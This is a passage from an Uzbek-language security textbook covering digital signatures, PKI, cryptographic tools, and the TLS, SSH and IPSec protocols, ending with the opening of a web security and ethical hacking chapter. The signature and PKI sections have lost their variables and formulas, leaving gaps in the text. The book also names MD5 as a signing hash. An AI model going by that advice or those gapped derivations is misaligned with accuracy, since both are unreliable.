“Elektron raqamli imzo (ERI) — elektron hujjatdagi mazkur elektron hujjat axborotini elektron raqamli imzoning yopiq kalitidan foydalangan holda, maxsus o‘zgartirish natijasida hosil qilingan, hamda elektron raqamli imzoning ochiq kaliti yordamida elektron hujjatdagi axborotda xatolik yo‘qligini aniqlash va elektron raqamli imzo yopiq kalitining egasini identifikatsiya qilish imkoniyatini beradigan imzo”.
Elektron raqamli imzo an’anaviy qog‘ozdagi imzo bilan bir xil yuridik kuchga ega bo‘lib, elektron hujjat aylanish tizimlarining ajralmas qismi hisoblanadi. ERI zamonaviy elektron hukumat tizimlari, bank axborot tizimlari, onlayn xizmatlar, korporativ hujjat almashinuvi va talab qilinadigan boshqa ko‘plab sohalarda keng qo‘llaniladi.
Elektron raqamli imzo oddiy qo‘lda qo‘yiluvchi imzo kabi, faqat elektron hujjatlarda qo‘yiladi va imzo qo‘yilgan ma’lumotning yaxlitligini ta’minlaydi va imzolovchining qo‘yilgan imzodan bosh tortmasligini (rad etmasligini) kafolatlaydi. Axborot xavfsizligida rad etish muammosi mavjud, unga ko‘ra foydalanuvchi hujjatni imzolaganini rad etadi (ya’ni, men imzolamadim deb turib oladi). Mazkur muammoni oldini olishda aynan elektron raqamli imzo tizimlaridan foydalaniladi. 
Shunday qilib, ERI tizimlari nafaqat ma’lumot yaxlitligini ta’minlaydi, balki imzolovchining majburiyatlardan tonishiga yo‘l qo‘ymaydi (yoki rad etishni oldini oladi). Shu sababli, ERI tizimlari ma’lumotlar yaxlitligini ta’minlovchi simmetrik kriptotizimlarga asoslangan MAC tizimlaridan ajralib turadi.
MAC tizimlarida xesh qiymatni qayta hisoblay olmaslik uchun, matnga kalit biriktirilgan bo‘lsa, ERI tizimlarida ma’lumotning xesh qiymati shaxsiy kaliti bilan “shifrlash” amalga oshiriladi va ERI hosil qilinadi. Ushbu xabarni “rasshifrovkalash” uchun esa tomonning ochiq kalitini bilishning o‘zi yetarli. Demak, oddiy imzo tizimiga o‘xshash (oddiy imzo tizimida bir kishi imzo qo‘yadi va qolganlardan uning haqiqiyligini tekshirish talab etiladi). ERI tizimida ham shaxsiy kalit egasi xabarni imzolaydi, qolganlar esa, uning ochiq kalitidan foydalanib, imzoni haqiqiyligini tekshiradi.
Elektron raqamli imzo odatda ochiq kalitli kriptografiya (PKI) arxitekturasiga asoslanadi. PKI quyidagi asosiy elementlardan tashkil topgan:
1. Shaxsiy kalit (private key)
Foydalanuvchi tomonidan maxfiy saqlanadi va hujjatni imzolashda qo‘llaniladi. Shaxsiy kalit hech qachon boshqa shaxsga oshkor qilinmasligi kerak.
2. Ochiq kalit (public key)
Imzoni tekshirish uchun xizmat qiladi va erkin tarqatilishi mumkin. Odatda ochiq kalit elektron raqamli sertifikat ko‘rinishida bo‘ladi.
3. Sertifikatlashtiruvchi markaz (Certification Authority, CA)
CA ochiq kalitlarning haqiqiyligini tekshiradi va rasmiy sertifikatlarni chiqaradi. Bu ochiq kalit egasining shaxsiga ishonchni ta’minlaydi.
4. Xesh funksiyasi
ERI jarayonida imzolanayotgan hujjatning xeshi (masalan, MD5 orqali) olinadi. Shundan so‘ng shaxsiy kalit yordamida aynan shu xesh qiymati imzolanadi. Bu jarayon katta hujjatlarni imzolashni ancha tezlashtiradi.
Elektron raqamli imzo quyidagi sohalarda keng qo‘llaniladi:
	•	elektron hukumat tizimlari (E-gov) - ariza, shikoyat, soliq hisobotlari, davlat xizmatlari;
	•	bank va moliyaviy operatsiyalar - elektron to‘lovlar, bank buyruqlari, kredit hujjatlari;
	•	korporativ elektron hujjat aylanishi - shartnomalar, buyruqlar, hisob-fakturalar;
	•	onlayn xizmatlar - autentifikatsiya va ruxsat berish mexanizmlarida;
	•	elektron savdo - onlayn shartnomalar va to‘lov tasdiqlari.
Imzo muolajalari: imzo qo‘yish, imzoni tekshirish
Agar A tomon xabar  ga imzo qo‘ygan bo‘lsa, u holda imzo   shaklida ifodalanadi (xuddi ochiq kalitli kriptografiyada shaxsiy kalit bilan rasshifrovkalash kabi). ERI tizimlarini yaratish ikkita muolajadan iborat:  ERIni shakllantirish va ERIni tekshirish (4.7-rasm).

4.7-rasm. Elektron raqamli imzo sxemasi
ERIni shakllantirish jarayoni. Faraz qilaylik,  tomondan  xabarni imzolash talab etilsin. Buning uchun xabar  ning xesh qiymati hisoblanadi:  So‘ngra, xabarning xesh qiymati  foydalanuvchining shaxsiy kaliti bilan “shifrlanadi” (bu haqiqiy shifrlash emas, shunchaki shaxsiy kalit bilan  ustida biror amal bajarishdan iborat) va imzo  hosil qilinadi. Hosil qilingan imzo ma’lumotga biriktirilib  qabul qiluvchiga uzatiladi.
ERIni tekshirish jarayoni. Faraz qilaylik,  tomondan  xabarga qo‘yilgan imzo  ni tekshirish talab etilsin. Buning uchun  tomon dastlab xabar  ni xesh qiymatini hisoblaydi:   tomonning ochiq kaliti bilan  ni “rasshifrovkalaydi” (bu haqiqiy rasshifrovkalash emas, shunchaki ochiq kalit bilan  ustida biror amal bajarishdan iborat) va  ni hosil qiladi. Agar ikkala xesh qiymatlar () o‘zaro teng bo‘lsa, ERI to‘g‘ri deb topiladi (demak xabar yaxlit).
Rad etishdan himoyalashni tushunishdan oldin, MAC asosida yaxlitlikni ta’minlashga biror sodda misol keltiraylik. Faraz qilaylik,  tomon o‘zining dilleriga  tomondan 100 ta aksiyani olishga buyurtma berdi. Berilgan buyurtmani yaxlitligini ta’minlash uchun  tomon  tomon bilan taqsimlangan kalit  yordamida MAC ni hisoblaydi. Ma’lum vaqt o‘tganidan so‘ng, buyurtmalar tayyor bo‘ladi. Biroq,  tomon to‘lovni amalga oshirishdan oldin aksiyalarning narxi tushib ketadi. Bu vaqtda,  tomon buyurtmani men bermadim deb turib oladi va uni rad etadi. Bunga yaxlitlikni ta’minlash uchun hisoblangan MAC ni har ikkala tomon ham hosil qilishi sabab bo‘ladi. 
Mazkur holat ERI bilan amalga oshirilsachi? Bunda,  tomon buyurtmani o‘zining shaxsiy kaliti bilan imzolab  tomonga yuboradi. Bu yerda,  tomon buyurtmani men bermadim deb rad eta olmaydi. Sababi, buyurtmani imzolash faqat shaxsiy kalit bilan amalga oshiriladi. Shaxsiy kalit esa, faqat  tomonga ma’lum.
Ochiq kalitlar infrastrukturasi
Ochiq kalitlar infrastrukturasi (Public  key  infrastructure, PKI). Ochiq kalitli kriptografiya bilan bog‘liq bo‘lgan muammolardan yana biri -  ochiq kalitning kimga tegishli ekanligini aniqlash. Faraz qilaylik,  tomon biror maxfiy xabar  ni  tomonga yubormoqchi. Buning uchun  tomon  tomonning ochiq kalitidan foydalanadi. Biroq, g‘arazli niyatda bo‘lgan  tomon o‘zining ochiq kalitini  tomonga  tomonni ochiq kaliti sifatida taqdim etadi.  tomonni mazkur holatni tekshirish imkoniyati bo‘lmagani bois, unga ishonadi va maxfiy xabarni  tomonning ochiq kaliti bilan shifrlaydi. 
Ushbu muammoni oldini olish uchun ochiq kalitli kriptografik tizimlarda ochiq kalitlar infrastrukturasidan foydalaniladi. 
Ochiq kalitlar infrastrukturasi yoki PKI real hayotda ochiq kalitli kriptotizimlardan xavfsiz foydalanish uchun talab etiluvchi barcha narsani o‘z ichiga oladi. PKI tarkibidagi barcha narsalarning birgalikda ishlashi juda ham murakkab jarayon, quyida ularning ayrim tashkil etuvchilari va PKI ning asosiy vazifalari bayon etilgan.
Raqamli sertifikat (yoki ochiq kalit sertifikati yoki qisqacha sertifikat) foydalanuvchining ismi va uning ochiq kalitidan iborat (amalda foydalanuvchiga va sertifikatga tegishli ma’lumotlar ham bo‘ladi) va u sertifikat markazi (certificate  authority yoki CA) tomonidan imzolanadi. Masalan,  tomonning sertifikati quyidagidan iborat bo‘ladi:
 va .
Ushbu sertifikatni tekshirish uchun  tomon  ni hisoblaydi va   ga tengligini tekshiradi.
 tomonga, odatda, ishonchli uchinchi tomon (trusted  third party yoki TTP) sifatida qaraladi. Ya’ni, odatda  tomon foydalanuvchi uchun shaxsiy va ochiq kalitlar juftini generatsiyalaydi. Shaxsiy kalit  tomonga taqdim etilganidan so‘ng, dan o‘chirib tashlanadi. Ochiq kalit esa sertifikat shaklida taqdim etiladi. Agar  tomon  tomonga biror ma’lumotni shifrlab yubormoqchi bo‘lsa, uning sertifikatidan foydalanadi. Buning uchun sertifikatdagi imzoni tekshirish talab etiladi. Bu esa o‘z navbatida  tomonning  ning ochiq kalitini (ya’ni, unga teng bo‘lgan sertifikatni) bilishi talab etiladi. Demak,  tomonning ochiq kaliti (yoki sertifikati) oldindan foydalanilayotgan tizimda mavjud va bu haqida barcha ma’lumotga ega bo‘ladi.
	Elektron raqamli imzo nima va u an’anaviy qog‘ozdagi imzodan qaysi jihatlari bilan farq qiladi?
	•	ERI tizimida autentifikatsiya, yaxlitlik va rad etishga yo‘l qo‘ymaslik qanday ta’minlanadi?
	•	ERI yaratish jarayonida xesh funksiyasi nima uchun ishlatiladi va uning roli nimadan iborat?
	•	Shaxsiy kalit (private key) va ochiq kalit (public key) o‘rtasidagi farq nima? Ularning ERI jarayonidagi vazifalarini tushuntiring.
	•	Sertifikatlashtiruvchi markaz (CA) qanday vazifalarni bajaradi va uning elektron imzo tizimidagi o‘rni nimadan iborat?
	•	Elektron raqamli imzo yaratish va tekshirish jarayonlari qanday bosqichlardan iborat? Har bir bosqichni izohlab bering?
	•	ERI qo‘llaniladigan asosiy sohalar qaysilar? Ularni amaliy misollar bilan tushuntirib bering?
	•	O‘zbekiston Respublikasida elektron raqamli imzo bilan bog‘liq huquqiy asoslar qanday me’yoriy hujjatlar orqali tartibga solinadi?
Nazorat savollari
	•	Elektron raqamli imzo nima va u an’anaviy qog‘ozdagi imzodan qaysi jihatlari bilan farq qiladi?
	•	ERI tizimida autentifikatsiya, yaxlitlik va rad etishga yo‘l qo‘ymaslik qanday ta’minlanadi?
	•	ERI yaratish jarayonida xesh funksiyasi nima uchun ishlatiladi va uning roli nimadan iborat?
	•	Shaxsiy kalit (private key) va ochiq kalit (public key) o‘rtasidagi farq nima? Ularning ERI jarayonidagi vazifalarini tushuntiring.
	•	Sertifikatlashtiruvchi markaz (CA) qanday vazifalarni bajaradi va uning elektron imzo tizimidagi o‘rni nimadan iborat?
	•	Elektron raqamli imzo yaratish va tekshirish jarayonlari qanday bosqichlardan iborat? Har bir bosqichni izohlab bering?
	•	ERI qo‘llaniladigan asosiy sohalar qaysilar? Ularni amaliy misollar bilan tushuntirib bering?
	•	O‘zbekiston Respublikasida elektron raqamli imzo bilan bog‘liq huquqiy asoslar qanday me’yoriy hujjatlar orqali tartibga solinadi?
Nazorat savollari
4.5. Kriptografik algoritmlardan real hayotda foydalanish  (Ma’ruza mashg‘uloti)
1. Kriptografik protokollar. 
2. Dasturiy-apparat kriptografik vositalar. 
3. HTTPS protokoli. 
4. SSH protokoli. 
5. IPSec protokoli.
Reja:
1. Kriptografik protokollar. 
2. Dasturiy-apparat kriptografik vositalar. 
3. HTTPS protokoli. 
4. SSH protokoli. 
5. IPSec protokoli.
Reja:

Kriptografik protokol, kriptografik dasturiy vosita, kriptografik apparat vosita, HTTPS protokoli, SSL/TLS protokoli, SSH protokoli, IPSec protokoli.
Kalit so‘zlar:
Kriptografik protokol, kriptografik dasturiy vosita, kriptografik apparat vosita, HTTPS protokoli, SSL/TLS protokoli, SSH protokoli, IPSec protokoli.
Kalit so‘zlar:
Dasturiy-apparat kriptografik vositalar
Oldingi mavzularda o‘rganilgan kriptografik algoritmlar amalda biror ko‘rinishdagi vosita sifatida amaliyotda foydalaniladi. Bu vositalar ma’lumotlarni ruxsatsiz foydalanishlardan himoya qilish, ularning o‘zgarmaganligini kafolatlash hamda shaxsning haqiqiyligini tekshirish imkonini beradi. Kriptografik himoya vositalari odatda uch asosiy toifaga bo‘linadi:
	•	dasturiy kriptografik vositalar;
	•	apparat kriptografik vositalar;
	•	apparat-dasturiy (gibrid) kriptografik vositalar.
Har bir tur ma’lum vazifalarni bajarish, xavfsizlik darajasi, ishlash tezligi va qo‘llanilish sohasiga ko‘ra farqlanadi.
1. Dasturiy kriptografik vositalar
Dasturiy kriptografik vositalar - bu kriptografik algoritmlar asosida ishlovchi dasturiy ta’minotlar bo‘lib, ular oddiy kompyuter yoki mobil qurilmada o‘rnatilgan holda ma’lumotni shifrlash yoki autentifikatsiya qilishni amalga oshiradi. Ularning asosiy afzalligi - moslashuvchanligi, keng funksionalligiga ega bo‘lishi va tez yangilanish imkonidir.
Afzalliklari:
	•	o‘rnatish va yangilash oson;
	•	turli platformalarda ishlaydi (Windows, Linux, Android va boshqalar);
	•	murakkab kriptografik algoritmlarni dasturiy shaklda tez joriy etish mumkin.
Kamchiliklari:
	•	dasturiy ta’minotning o‘zi virus yoki eksploitlarga nisbatan zaif bo‘lishi mumkin;
	•	maxfiy kalitlarni himoyalash darajasi apparatga nisbatan past.
Misollar:
	•	GPG (GNU Privacy Guard) — ochiq kalitli kriptografiya yordamida xabarlarni shifrlash va raqamli imzo yaratish vositasi;
	•	VeraCrypt — disklar va kataloglarni to‘liq shifrlash dasturi;
	•	OpenSSL — TLS/SSL protokollarida foydalaniladigan shifrlash va xesh funksiyalar to‘plami;
	•	BitLocker (dasturiy rejimda) — Windows tizimida diskni shifrlash;
	•	Mobil ilovalarda: WhatsApp va Signal protokollari (dasturiy darajadagi end-to-end shifrlash).
2. Apparat kriptografik vositalari
Apparat kriptografik vositalar - maxsus ishlab chiqilgan fizik qurilmalar bo‘lib, ular kriptografik operatsiyalarni (shifrlash, kalitlarni saqlash, autentifikatsiya) apparat darajasida bajaradi. Bu vositalar yuqori tezlik va katta xavfsizlik talab etiladigan tizimlarda qo‘llanadi.
Afzalliklari:
	•	maxfiy kalitlar apparatda saqlanadi va tashqi dasturlar tomonidan o‘g‘irlab bo‘lmaydi;
	•	qo‘shimcha xavfsizlik mexanizmlari (tamper-resistant) mavjud;
	•	katta hajmdagi kriptografik operatsiyalarni yuqori tezlikda bajaradi.
Kamchiliklari:
	•	narxi qimmatroq;
	•	yangilash murakkab bo‘lishi mumkin;
	•	moslashuvchanlik darajasi past (faqat oldindan belgilangan algoritmlar ishlatiladi).
Misollar:
	•	HSM (Hardware Security Module) - korporativ va bank tizimlarida kalitlarni xavfsiz saqlaydigan apparat;
	•	TPM (Trusted Platform Module) - kompyuter onaplatasiga o‘rnatilgan xavfsizlik chipi, Windows BitLocker undan foydalanadi;
	•	Smart-kartalar va USB-tokenlar - ERI (elektron raqamli imzo) uchun maxfiy kalitlarni saqlaydi;
	•	raqamli kalit generatorlari - serverlar uchun tasodifiy sonlar generatorlari.
Masalan, bankomatlar, PCI-DSS talablari bo‘yicha to‘lov terminallari, E-gov tizimidagi ERI tokenlari - bular to‘liq apparat kriptografik vositalardir.
3. Apparat-dasturiy (gibrid) kriptografik vositalar

Bu toifa apparatning xavfsizligini va dasturiy ta’minotning moslashuvchanligini birlashtiradi. Ko‘pincha dasturiy kriptografik algoritmlar maxsus xavfsiz apparat muhitida bajariladi.
Afzalliklari:
	•	yuqori xavfsizlik + moslashuvchan funksionallik;
	•	kriptografik kalitlar apparat ichida himoyalangan holda saqlanadi;
	•	uskuna tezligi bilan dasturiy qulaylik birlashadi.
Kamchiliklari:
	•	narxi oddiy dasturiy vositalarga nisbatan yuqoriroq;
	•	ba’zan maxsus drayverlar yoki qo‘shimcha modullar talab etadi.
Misollar:
	•	BitLocker + TPM - BitLocker shifrlash dasturi TPM chipi bilan birgalikda ishlaganda apparat-dasturiy himoya hosil bo‘ladi;
	•	YubiKey tokenlari - apparat darajasida kalit saqlaydi, dasturiy xavfsizlik protokollari bilan ishlaydi;
	•	Apple Secure Enclave - iPhone va Mac qurilmalarida biometrik ma’lumotlar va kalitlar maxsus xavfsiz apparat joyida saqlanadi, lekin asosiy tizim dasturiy ravishda boshqaradi;
	•	HSM yordamida TLS ishlashi - server dasturi TLS almashinuvida apparat modulidagi kalitlardan foydalanadi.
Kriptografik himoya vositalarining qo‘llanilish sohalari:
	•	bank va moliyaviy tizimlar - tranzaksiyalar xavfsizligi, raqamli imzo, PIN-kodlarni shifrlash uchun;
	•	elektron hukumat (E-gov) - ERI, foydalanuvchini identifikatsiya qilish, hujjat aylanishida;
	•	harbiy va maxfiy tizimlar - ma’lumotlarni shifrlash, xavfsiz kanallar yaratish uchun;
	•	bulutli xizmatlar - server kalitlarini himoyalash (HSM cloud);
	•	mobil qurilmalar - biometrik ma’lumotlarni xavfsiz saqlash;
	•	Internet xavfsizligi - SSL/TLS sertifikatlari, VPN tunnellari, autentifikatsiya tizimlarining muhim parametrlarini saqlash uchun.
Kriptografik protokollar
Zamonaviy axborot-kommunikatsiya tizimlarida ma’lumot almashinuvi global tarmoqlar orqali olib borilayotganligi sababli, ushbu jarayonning xavfsizligini ta’minlash dolzarb masalaga aylangan. Ochiq tarmoqlar orqali uzatilayotgan ma’lumotlar ruxsatsiz foydalanish, soxta uzatish, tarmoqdagi faol va passiv hujumlar, paketlarni tutib qolish, man-in-the-middle (MITM) va boshqa keng tarqalgan xavflarga uchrashi mumkin. Shu sababli ushbu tahdidlarga qarshi kurashishda kriptografik protokollar muhim rol o‘ynaydi. Kriptografik protokollar ma’lumotlarning maxfiyligi, yaxlitligi, autentifikatsiyasi va rad etish yo‘l qo‘ymaslik tamoyillarini ta’minlaydigan murakkab mexanizmlar majmuasidan iborat.
Quyida amaliyotda eng ko‘p qo‘llaniladigan kriptografik protokollar - HTTPS (TLS/SSL), IPSec va SSH protokollarining arxitekturasi, ishlash mexanizmlari va qo‘llanilish sohasi batafsil yoritiladi.
HTTPS protokoli
HTTPS (HyperText Transfer Protocol Secure) - bu HTTP protokolining xavfsizlik qatlamini o‘z ichiga olgan kengaytirilgan shakli bo‘lib, u TLS (Transport Layer Security) yoki TLSning dastlabki varianti hisoblangan SSL (Secure Sockets Layer) protokoli yordamida himoyalangan aloqa kanalini yaratadi. HTTPS bugungi internetning deyarli barcha xavfsiz xizmatlarining asosini tashkil etadi.
HTTPS protokoli quyidagi tahdidlarni oldini oladi:
	•	paketlarni o‘qib olish, o‘zgartirish (sniffing orqali);
	•	MITM hujumlari;
	•	takrorlash hujumlari;
	•	tarmoq ma’lumotlarini soxtalashtirishlar (spoofing).
HTTPS ikki asosiy komponentdan iborat: Transport qatlami (TLS/SSL), bu qatlam shifrlash, autentifikatsiya va xabar yaxlitligini himoya qiladi; Ilova qatlami (HTTP), odatiy HTTP so‘rov va javoblari TLS orqali shifrlangan kanal orqali uzatiladi.
TLS/SSL protokolining asosiy funksiyalari quyidagilar:
1. Server autentifikatsiyasini ta’minlash: brauzer serverning sertifikatini tekshiradi. Sertifikat markazi (CA) tasdiqlamagan sertifikatga ishonilmaydi.
2. Ma’lumotlarning maxfiyligini ta’minlash: simmetrik shifrlash (AES, ChaCha20, AES-GCM) qo‘llaniladi.
3. Yaxlitlik va autentifikatsiyani ta’minlash: HMAC yoki AEAD rejimlari (AES-GCM, ChaCha20-Poly1305) orqali ma’lumotlarning buzilmaganligi tekshiriladi.
4. Xavfsiz kalit almashinuvini ta’minlash: Diffie-Hellman yoki Elliptic Curve Diffie-Hellman yordamida sessiya kaliti yaratiladi.
TLS/SSL Handshake protsedurasi tomonlar o‘rtasida autentifikatsiyani, sessiya kalitlar taqsimlanishini amalga oshirib, quyidagi bosqichlardan iborat:
1. ClientHello
Mijoz brauzeri: qo‘llab-quvvatlaydigan shifrlash algoritmlari, versiya, tasodifiy son yuboradi.
2. ServerHello
Server tanlangan algoritmni bildiradi va sertifikatni yuboradi.
3. Sertifikatni tekshirish
Mijoz sertifikatni CA orqali tasdiqlaydi.
4. Kalit almashinuvi
Diffie-Hellman/ECDHE orqali sessiya kaliti kelishib olinadi.
5. Shifrlangan bog‘lanish o‘rnatilishi
Keyingi barcha trafik simmetrik kalit bilan shifrlanadi.
HTTPS (TLS/SSL) protokoli quyidagi sohalarda keng qo‘llanilmoqda:
	•	onlayn banking va to‘lov tizimlarida;
	•	davlat xizmatlarida (e-gov);
	•	korporativ web-resurslarda;
	•	deyarli barcha web saytlarda.
SSH protokoli
SSH (Secure Shell) - xavfsiz masofaviy ulanishni, buyruqlarni bajarishni va fayllarni uzatishni ta’minlaydigan kriptografik protokol bo‘lib, u serverlarni boshqarish, masofaviy ro‘yxatdan o‘tish va xavfsiz terminal sessiyalarini yaratishda keng qo‘llaniladi.
SSH protokoli Telnet, Rlogin kabi himoyasiz protokollarning o‘rnini egallagan.
SSH protokolining asosiy tashkil etuvchilari
1. Transport qatlami: shifrlangan kanal yaratadi (AES, ChaCha20);
2. Autentifikatsiya qatlami: foydalanuvchini parol orqali, ochiq/shaxsiy kalit jufti, sertifikatlar asosida tekshiradi.
3. Ilova qatlami: masofaviy buyruqlar, tunellash, SFTP va SCP xizmatlarini taqdim etadi.
SSH protokoli quyidagi xizmatlarda keng qo‘llaniladi
1. Masofadan turib foydalanish: administratorlar Linux, Unix va serverlarni SSH orqali boshqaradi.
2. Xavfsiz fayl almashish: SCP (Secure Copy Protocol), SFTP (SSH File Transfer Protocol) protokollarini qurishda.
3. Port Forwarding (Tunellash): SSH orqali boshqa protokollarni xavfsiz kanalda uzatish mumkin.
SSH protokoli sniffing, parolni o‘g‘irlash, o‘rtada-turgan odam hujumi va tarmoqdagi ko‘plab hujumlardan himoya qiladi. Shu sababli, SSH bugungi kunda tizim boshqaruvi va DevOps jarayonlarida asosiy vosita hisoblanadi.
IPSec protokoli
IPSec (Internet Protocol Security) - ochiq tarmoqlar orqali o‘tuvchi IP paketlarni himoya qiluvchi kriptografik protokol to‘plami bo‘lib, u OSI modelining tarmoq (Network Layer) qatlamida ishlaydi. IPSecning asosiy maqsadi - ikki nuqta o‘rtasida xavfsiz virtual kanal yaratishdir.
IPSec protokoli tarmoqlararo paketlarni ushlab qolish, paketlarni o‘zgartirish, IP spoofing, takrorlash kabi hujumlardan samarali himoyani ta’minlaydi.
IPSec protokoli quyidagi asosiy tashkil etuvchilardan iborat:
1. AH (Authentication Header): paketlarning yaxlitligi va autentifikatsiyasini ta’minlaydi.
2. ESP (Encapsulation Security Payload): paketlarni to‘liq shifrlaydi va ularni autentifikatsiya qiladi.
3. IKE (Internet Key Exchange): kriptografik kalitlar almashinuvi va tunel parametrlari bo‘yicha kelishuv protsedurasini bajaradi.
IPSec protokoli quyidagi rejimlarda ishlaydi:
1. Transport rejimi: faqatgina IP paketining ma’lumot qismi (payload) shifrlanadi, bu mijozlar orasidagi aloqa uchun juda mos.
2. Tunnel rejimi: butun IP paketi inkapsulyatsiyalanadi, Ofis-to-ofis VPNlar va LAN-to-LAN aloqalarda qo‘llaniladi.
IPSec protokoli quyidagi sohalarda keng qo‘llanilmoqda
	•	VPN texnologiyalarini qurishda;
	•	Korporativ tarmoqlarni masofaviy ulashda;
	•	Xavfsiz tarmoq kanallarini tashkil qilishda;
	•	DC (Data Center) va filiallar o‘rtasida xavfsiz kanal yaratishda.
IPSec yuqori darajadagi xavfsizlik, ishonchlilik va paket darajasida himoya bilan alohida ajralib turadi.
	Kriptografik himoya vositalari nima va ular axborot xavfsizligida qanday vazifalarni bajaradi?
	•	HTTPS protokoli qanday xavfsizlik xizmatlarini ta’minlaydi va TLS/SSL protokollarining bu jarayondagi roli nimadan iborat?
	•	IPSec protokoli qanday komponentlardan tashkil topgan va ular IP paketlarini himoyalashda qanday funksiyalarni bajaradi?
	•	SSH protokoli an’anaviy Telnet yoki Rlogin kabi protokollardan qaysi jihatlari bilan farq qiladi?
	•	Dasturiy kriptografik vositalar (OpenSSL, VeraCrypt, GPG va boshqalar) qanday afzallik va kamchiliklarga ega?
	•	VPN texnologiyalarida IPSecning o‘rni va afzalliklari nimada?
Nazorat savollari
	•	Kriptografik himoya vositalari nima va ular axborot xavfsizligida qanday vazifalarni bajaradi?
	•	HTTPS protokoli qanday xavfsizlik xizmatlarini ta’minlaydi va TLS/SSL protokollarining bu jarayondagi roli nimadan iborat?
	•	IPSec protokoli qanday komponentlardan tashkil topgan va ular IP paketlarini himoyalashda qanday funksiyalarni bajaradi?
	•	SSH protokoli an’anaviy Telnet yoki Rlogin kabi protokollardan qaysi jihatlari bilan farq qiladi?
	•	Dasturiy kriptografik vositalar (OpenSSL, VeraCrypt, GPG va boshqalar) qanday afzallik va kamchiliklarga ega?
	•	VPN texnologiyalarida IPSecning o‘rni va afzalliklari nimada?
Nazorat savollari
V BOB. WEB XAVFSIZLIK VA ETHICAL HACKING ASOSLARI


V BOB. WEB XAVFSIZLIK VA ETHICAL HACKING ASOSLARI







Ta’lim maqsadlari:
−	web-saytlarning ishlash tamoyillarini (HTTP, HTML, mijoz–server modeli) tushuntiradi va izohlaydi;
−	web brauzerning maxsus vositalari (Developer Tools) yordamida HTTP so‘rov va javoblarini tahlil qiladi, asosiy sarlavha (header) va parametrlarni aniqlaydi;
−	asosiy web-zaifliklarni (SQL Injection, XSS, CSRF, autentifikatsiya xatolari) ta’riflaydi va farqlaydi;
−	xavfsiz muhitda SQL injection va XSS hujumlarini modellashtiradi hamda ularning ishlash mexanizmini tahlil qiladi;
−	etik xakerlik tushunchasini, white-hat, gray-hat va black-hat yondashuvlarini taqqoslaydi hamda huquqiy cheklovlarni asoslaydi;
−	lokal nishon (target) ustida etik razvedka jarayonini amalga oshiradi va topilgan ma’lumotlarni tizimlashtiradi;
−	web-xavfsizlik vositalari (Burp Suite, OWASP ZAP, Wappalyzer) ning vazifalarini tahlil qiladi va ulardan amaliy foydalanadi;
−	OWASP Top 10 ro‘yxatidagi asosiy xavflarni izohlaydi va demo web-ilovada aniqlangan zaifliklarni bartaraf etadi;
−	xavfsiz web-forma yaratadi, foydalanuvchi kiritgan qiymatlarni tozalash (input sanitization) orqali zaifliklarning oldini olish bo‘yicha amaliy yechim ishlab chiqadi.
Bobni o‘zlashtirish uchun tavsiya etiladigan qo‘shimcha kurslar:
1. OWASP ZAP bilan veb-ilova xavfsizligini sinash (Web Application Security Testing with OWASP ZAP) - https://www.coursera.org/projects/web-application-security-testing-with-owsap-zap 
2. Web-ilovalar uchun dasturiy ta'minot xavfsizligi (Software Security for Web Applications) - https://www.coursera.org/learn/codio-software-security-for-web-applications 
5-bob haqida umumiy ma’lumot
Mazkur bobda web saytlar qanday ishlashi, web tizimlarda keng tarqalgan zaifliklar, xususan OWASP TOP 10 zaifliklari, Etik xakerlik va uning qonuniy asoslarini belgilash, web saytlar xavfsizligini ta’minlashda keng foydalaniluvchi vositalar nazariy va amaliy jihatidan tushuntiriladi.
5.1. Web saytlar qanday ishlaydi  (Ma’ruza mashg‘uloti)
1. Web sayt nima va u qanday ishlaydi. 
2. Web sayt turlari: statik va dinamik sayt.
3. Klient-server arxitekturasi.
Reja:
1. Web sayt nima va u qanday ishlaydi. 
2. Web sayt turlari: statik va dinamik sayt.
3. Klient-server arxitekturasi.
Reja:

Web sayt, web sahifa, web brauzer, mijoz, server, domen, host,  API, front-end, back-end, HTML, CSS, Javascript, statik va dinamik sayt, DNS.
Kalit so‘zlar:
Web sayt, web sahifa, web brauzer, mijoz, server, domen, host,  API, front-end, back-end, HTML, CSS, Javascript, statik va dinamik sayt, DNS.
Kalit so‘zlar:
Bugungi raqamli dunyoda, siz biznes egasi, marketolog yoki shunchaki internet qanday ishlashini bilishga qiziqqan bo‘lishingizdan qat’i nazar, web-saytlarning asoslarini tushunish juda muhimdir. Har qanday muvaffaqiyatli onlayn faoliyat fundamental web tushunchalarini puxta anglashdan boshlanadi.
Ushbu mavzuda sizga web-saytlar haqida bilishingiz kerak bo‘lgan barcha ma’lumotlar tushuntirib beriladi.
Web sayt nima?
Web-sayt - bu umumiy domen nomi bilan aniqlanadigan va kamida bitta web-serverda joylashtirilgan web-sahifalar hamda ular bilan bog‘liq kontent to‘plamidir. Web-saytlarga internet orqali web-brauzerlar yordamida kiriladi.
Web-saytlarning bir nechta qo‘llanilish sohalari mavjud. Ular ijtimoiy aloqalarni osonlashtiradi, internet savdosini yo‘lga qo‘yadi va turli ma’lumotlarni taqdim etadi.
Internetga ulangan foydalanuvchi brauzeriga web-sayt manzilini kiritganda, sahifani olish va ko‘rsatish uchun bir qancha bosqichlar amalga oshadi. Domen nomlari tizimi (DNS) domen nomini IP manzilga aylantiradi. Bu brauzerga web-sayt serverini topish imkonini beradi.
Ulanish o‘rnatilgach, server web-sahifani tashkil qiluvchi HTML kodi, CSS fayllari, JavaScript fayllari va boshqa resurslarni yuboradi.
Texnik jihatdan tushuntirish: Web-saytlar odatda server deb ataladigan fizik kompyuterlarda joylashtiriladi. Bularni web-xosting provayderlari taqdim etadi. Ushbu serverlar web-saytni ishlatish uchun zarur bo‘lgan barcha resurslarni saqlaydi. Foydalanuvchi web-manzilni kiritganida, server sahifani ko‘rsatish uchun kerakli fayllarni yubora olishi ta’minlanadi.
Web-sayt qanday quriladi?
Web-sayt yaratish tez va samarali tarzda professional onlayn platforma barpo etish uchun bir nechta muhim bosqichlarni o‘z ichiga oladi:
Maqsad va auditoriyani aniqlash: aniq maqsadlar va kerakli nom, brend, identifikatorni belgilash.
Sayt tuzilmasini rejalash: bosh sahifa, maqsadli (landinga) sahifalar, aloqa sahifasi kabi asosiy bo‘limlarni shakllantirish.
Vizual dizayn yaratish: brendga mos ranglar, shriftlar va maketlar tanlash.
Web-sahifalarni ishlab chiqish: HTML, CSS va JavaScript yordamida ko‘p brauzerlar va mobil qurilmalar bilan moslashuvchan, qulay va sezgir sahifalar yaratish.
Saytni joylashtirish (hosting): web-sayt fayllarini ishonchli hosting provayderi orqali barqaror web-serverga yuklash.
Ishlash samaradorligini oshirish: rasmlarni siqish, meta tavsiflarni to‘g‘ri yozish, sayt tezligi va qidiruv tizimidagi reytingni yaxshilash.
